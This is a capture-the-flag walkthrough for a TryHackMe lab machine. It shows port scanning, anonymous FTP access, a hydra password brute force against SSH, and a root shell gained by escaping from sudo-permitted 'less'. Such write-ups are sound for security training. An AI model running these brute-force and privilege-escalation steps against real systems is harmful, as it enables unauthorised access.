# Brooklyn Nine Nine | https://tryhackme.com/room/brooklynninenine
![b99](https://i.imgur.com/hJToewe.png)



## Enumeration 
```
nmap -v -A -T4 -p- 10.10.147.67

21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17 23:17 note_to_jake.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.2.50
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

We have ftp anon login so next ftp to it and get the note_to_jake.txt.
```
![b99](https://i.ibb.co/m9139St/d.png)

```
~$ cat note_to_jake.txt 
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```
so weak password huh? 
``
fredi@index:~$ hydra -l jake -P wordlists/rockyou.txt ssh://10.10.239.250 -t 20
attacking ssh://10.10.239.250:22/
[22][ssh] host: 10.10.239.250   login: jake   password: <redacted>
``
Then ssh into the machine.
:~$ ssh jake@10.10.239.250

## Priviledge Escalation
```
jake@brookly_nine_nine:~$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
    ``` 
so no need for sudo password for "less" ok.
https://gtfobins.github.io/gtfobins/less/

jake@brookly_nine_nine:~$ sudo less /etc/profile
!/bin/sh

And Thats IT we have root ! Now go get the flags!

